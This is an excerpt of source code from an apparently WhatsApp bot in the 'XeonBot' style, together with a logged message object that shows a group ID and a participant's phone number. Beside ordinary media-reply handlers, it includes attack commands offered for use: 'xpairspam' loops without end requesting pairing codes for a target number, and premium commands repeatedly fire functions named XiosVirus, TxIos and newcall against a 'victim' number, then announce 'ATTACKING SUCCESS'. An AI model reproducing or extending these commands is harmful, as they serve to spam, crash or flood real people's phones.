...
XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: subscribe_dgxeon }).catch(e => {
return reply("Erro..")
})
}
...
WebMessageInfo {
  ...
  eventResponses: [],
  key: MessageKey {
    remoteJid: '120363219043828032@g.us',
    fromMe: true,
    id: '3EB04A092650B23821C753'
  },
  message: Message {
    extendedTextMessage: ExtendedTextMessage { text: 'hi', contextInfo: [Object] }
  },
  messageTimestamp: Long { low: 1731451201, high: 0, unsigned: true },
  status: 1,
  participant: '212658323376:21@s.whatsapp.net'
}
...
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: subscribe_dgxeon })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: subscribe_dgxeon })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: subscribe_dgxeon })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: subscribe_dgxeon })
}
}
...
contacts: list }, mentions: [sender] }, { quoted: subscribe_dgxeon })
...
await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: subscribe_dgxeon })     
break
...
case 'xpairspam': {
 ...
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
    ...
    let { state } = await useMultiFileAuthState('spam');
    ...
    for (;;) {
        for (let i = 0; i < 20; i++) {
            ...
            try {
                ...
                await XeonBotInc.sendMessage(target, { text: `Pairing Code: ${prc}` });
            } catch (error) {
...
if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 212xxxxxxxx`)
  ...
  for (let i = 0; i < 10; i++) {
  await XiosPay(victim)
  await XiosVirus(victim)
  await TxIos(victim)
  await sleep(1)
  }
...
if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 212xxxxxxxx`)
  ...
  await newcall3(victim)
  await newcall4(victim)
  await sleep(1)
  }
  replygcxeon(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」`)
}
                    ...
                    XeonBotInc.sendMessage(m.chat, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: "./XeonMedia/thumb.jpg",
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
